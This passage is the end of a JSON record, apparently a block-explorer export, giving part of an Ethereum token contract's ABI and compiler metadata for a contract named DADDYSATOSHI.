internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"unauthorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_router\",\"type\":\"address\"}],\"name\":\"updateRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vsN\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vsWb\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "DADDYSATOSHI", "CompilerVersion": "v0.7.4+commit.3f05b770", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://24029d2a70bf3da8210ff1d0f02138c9316763b1f2957e977331cdf4e36669c9"}